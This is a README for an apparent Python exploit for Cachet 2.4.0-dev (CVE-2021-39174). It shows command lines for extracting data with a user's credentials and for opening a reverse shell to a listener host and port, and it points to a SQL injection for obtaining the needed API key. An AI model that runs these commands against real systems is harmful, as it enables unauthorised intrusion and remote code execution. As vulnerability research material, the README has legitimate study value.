# CVE-2021-39174 Cachet 2.4.0-dev

A python3 script for CVE-2021-39174 Cachet 2.4.0-dev Information Disclosure and RCE via Twig Server Side Template Injection. For the RCE the API KEY for the user is needed. Check out the Leave Songs link below which covers how to get the API KEY via SQL Injection CVE-2021-39165.

## Getting Started

### Executing program

* Data Extraction
```
python3 cachet_2.4.0-dev.py -t http://cachet.site/ -u username -p password
```

* Reverse Shell
```
python3 cachet_2.4.0-dev.py -t http://cachet.site/ -u username -p password -k API_KEY -lhost 127.0.0.1 -lport 1337
```

## Help

For help menu:
```
python3 cachet_2.4.0-dev.py -h
```

## Acknowledgments

* [SonarSource](https://blog.sonarsource.com/cachet-code-execution-via-laravel-configuration-injection/)
* [Leave Songs](https://www.leavesongs.com/PENETRATION/cachet-from-laravel-sqli-to-bug-bounty.html)

## Disclaimer
All the code provided on this repository is for educational/research purposes only. Any actions and/or activities related to the material contained within this repository is solely your responsibility. The misuse of the code in this repository can result in criminal charges brought against the persons in question. Author will not be held responsible in the event any criminal charges be brought against any individuals misusing the code in this repository to break the law.